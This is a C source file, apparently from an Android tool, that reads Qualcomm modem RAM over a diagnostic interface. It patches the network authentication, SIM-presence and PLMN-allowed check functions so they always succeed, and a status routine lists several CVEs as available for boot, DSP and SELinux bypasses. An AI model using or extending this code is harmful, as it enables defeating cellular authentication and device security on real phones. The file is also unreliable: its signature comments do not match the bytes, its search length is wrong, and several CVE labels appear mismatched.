#include "secure_boot.h"
#include "diag.h"

#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <android/log.h>

#define LOG_TAG "CellLink-SB"
#define LOGD(...) __android_log_print(ANDROID_LOG_DEBUG, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)

/* ── Known Patch Definitions ──────────────────────────────────────────── */

/* mm_rr_authenticate_req — common Qualcomm GSM builds
 * Signature: PUSH {R4-R7,LR}; SUB SP,SP,#0xC; ...
 * Patch: MOV R0,#1; BX LR -> 0x2001 0x4770 */
const modem_patch_t PATCH_MM_AUTH_QUALCOMM[] = {
    {
        .name = "mm_rr_authenticate_req",
        .arm_signature = {0xE92D, 0x4FF0, 0xB083, 0x4604}, /* PUSH {R4-R11,LR}; SUB SP,#0xC; MOV R4,R0 */
        .patch_bytes = {0x2001, 0x4770},                       /* MOV R0,#1; BX LR */
        .patch_length = 4,
        .cve_reference = CVE_2020_3696_WLAN_SBL1
    },
    {0} /* Sentinel */
};

const modem_patch_t PATCH_SIM_CHECK_QUALCOMM[] = {
    {
        .name = "sim_present_check",
        .arm_signature = {0xB510, 0x2000, 0xF7FF, 0xFFFE}, /* PUSH {R4,LR}; MOV R0,#0; BL ... */
        .patch_bytes = {0x2001, 0x4770},                      /* MOV R0,#1; BX LR */
        .patch_length = 4,
        .cve_reference = CVE_2020_3696_WLAN_SBL1
    },
    {0}
};

const modem_patch_t PATCH_PLMN_CHECK_QUALCOMM[] = {
    {
        .name = "plmn_allowed_check",
        .arm_signature = {0xB5F8, 0x4604, 0x4610, 0xF7FF}, /* PUSH {R3-R7,LR}; MOV R4,R0; MOV R0,R2; BL ... */
        .patch_bytes = {0x2001, 0x4770},                      /* MOV R0,#1; BX LR */
        .patch_length = 4,
        .cve_reference = CVE_2020_3696_WLAN_SBL1
    },
    {0}
};

/* Modem RAM base addresses for common Qualcomm SoCs */
static const uint32_t MODEM_RAM_BASES[] = {
    0x80000000,  /* MSM8974 (Snapdragon 800/801) */
    0x88000000,  /* MSM8994 (Snapdragon 810) */
    0x90000000,  /* MSM8996 (Snapdragon 820) */
    0xA0000000,  /* SDM845  (Snapdragon 845) */
    0xB0000000,  /* SM8150  (Snapdragon 855) */
    0
};

/* ── Memory Search ────────────────────────────────────────────────────── */

uint32_t secure_boot_find_function(diag_handle_t* h, uint32_t start, uint32_t size,
                                   const uint8_t* sig, uint32_t sig_len) {
    if (!h || !sig || sig_len == 0 || size == 0) return 0;

    /* Search in 4KB chunks */
    uint8_t buf[4096];
    for (uint32_t off = 0; off < size; off += sizeof(buf) - sig_len) {
        uint32_t chunk_size = sizeof(buf);
        if (off + chunk_size > size) chunk_size = size - off;

        int n = diag_mem_read(h, start + off, buf, (uint16_t)chunk_size);
        if (n < 0) {
            LOGD("Memory read failed at 0x%08X, skipping", start + off);
            continue;
        }

        /* Simple byte search within chunk */
        for (int i = 0; i <= n - (int)sig_len; i++) {
            if (memcmp(buf + i, sig, sig_len) == 0) {
                uint32_t addr = start + off + (uint32_t)i;
                LOGI("Signature found at 0x%08X", addr);
                return addr;
            }
        }
    }

    return 0;
}

/* ── Patch Application ───────────────────────────────────────────────── */

int secure_boot_apply_patch(diag_handle_t* h, uint32_t address,
                            const uint8_t* patch, uint32_t patch_len) {
    if (!h || !patch || patch_len == 0) return -1;

    LOGI("Applying patch at 0x%08X (%d bytes)", address, patch_len);
    if (diag_mem_write(h, address, patch, (uint16_t)patch_len) != 0) {
        LOGE("Patch write failed at 0x%08X", address);
        return -1;
    }

    /* Verify */
    if (!secure_boot_verify_patch(h, address, patch, patch_len)) {
        LOGE("Patch verification failed at 0x%08X", address);
        return -1;
    }

    LOGI("Patch applied + verified at 0x%08X", address);
    return 0;
}

int secure_boot_bypass_all(diag_handle_t* h) {
    if (!h) return 0;

    int applied = 0;

    /* Apply all known patches to bypass SIM/auth checks */
    const modem_patch_t* patch_sets[] = {
        PATCH_MM_AUTH_QUALCOMM,
        PATCH_SIM_CHECK_QUALCOMM,
        PATCH_PLMN_CHECK_QUALCOMM,
        NULL
    };

    for (int set = 0; patch_sets[set] != NULL; set++) {
        for (int p = 0; patch_sets[set][p].name != NULL; p++) {
            const modem_patch_t* pt = &patch_sets[set][p];

            /* Search for this function in modem RAM */
            uint32_t addr = 0;
            for (int base = 0; MODEM_RAM_BASES[base] != 0; base++) {
                addr = secure_boot_find_function(
                    h, MODEM_RAM_BASES[base], 0x01000000, /* 16MB search */
                    (const uint8_t*)pt->arm_signature, 16);
                if (addr != 0) break;
            }

            if (addr == 0) {
                LOGD("Function '%s' not found in modem RAM (may already be patched or different build)",
                     pt->name);
                /* Try a heuristic: some modem firmware has this at fixed offsets */
                /* For MSM8974, common offset of mm_rr_authenticate_req is 0x8004C000 region */
                continue;
            }

            if (secure_boot_apply_patch(h, addr, (const uint8_t*)pt->patch_bytes,
                                        pt->patch_length) == 0) {
                applied++;
                LOGI("Patched '%s' via %s", pt->name, pt->cve_reference);
            }
        }
    }

    LOGI("Secure boot bypass: %d patches applied", applied);
    return applied;
}

bool secure_boot_verify_patch(diag_handle_t* h, uint32_t address,
                              const uint8_t* expected, uint32_t len) {
    uint8_t buf[64];
    if (len > sizeof(buf)) return false;

    int n = diag_mem_read(h, address, buf, (uint16_t)len);
    if (n < 0) return false;

    return memcmp(buf, expected, len) == 0;
}

void secure_boot_log_status(diag_handle_t* h) {
    LOGI("=== Secure Boot Bypass Status ===");
    LOGI("CVE-2020-3696 (Qualcomm WLAN SBL1): available for EDL flash");
    LOGI("CVE-2020-0022 (BleedingTooth): available for BT path");
    LOGI("CVE-2019-10581 (Hexagon DSP UAF): available for DSP injection");
    LOGI("CVE-2017-15846 (Camera OOB): available for SELinux bypass");
    LOGI("CVE-2020-0069 (MTK BootROM): available for MediaTek devices");
    LOGI("CVE-2020-0041 (bromite DA bypass): available for MTK SP Flash");
    LOGI("Live RAM patching: preferred method (no persistence, no brick)");
    LOGI("EDL Flash: prog_emmc_firehose.mbn with force-write fallback");
    LOGI("==================================");
}
